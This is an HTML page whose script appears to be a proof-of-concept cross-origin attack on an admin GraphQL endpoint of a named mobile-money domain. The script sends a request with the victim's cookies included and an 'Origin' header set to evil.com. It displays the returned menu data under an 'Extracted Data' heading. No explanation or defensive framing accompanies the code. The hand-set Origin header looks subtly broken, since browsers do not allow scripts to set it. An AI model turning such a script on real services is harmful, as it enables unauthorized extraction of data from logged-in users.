<html>
  <body>
    <h2>Extracted Data:</h2>
    <pre id="output"></pre>

    <script>
      fetch("https://admin.m-pesa.africa/graphql", {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
          "Origin": "https://evil.com"
        },
        body: JSON.stringify({
          operationName: "mainMenuQuery",
          variables: {},
          query: `query mainMenuQuery {
            mainMenu {
              data {
                attributes {
                  body {
                    ... on ComponentMenuDropdown {
                      id
                      label
                      submenu {
                        id
                        label
                        url
                      }
                    }
                    ... on ComponentMenuLink {
                      id
                      label
                      url
                    }
                  }
                }
              }
            }
          }`
        })
      })
      .then(res => res.json())
      .then(data => {
        document.getElementById("output").innerText = JSON.stringify(data, null, 2);
      })
      .catch(err => console.error(err));
    </script>
  </body>
</html>
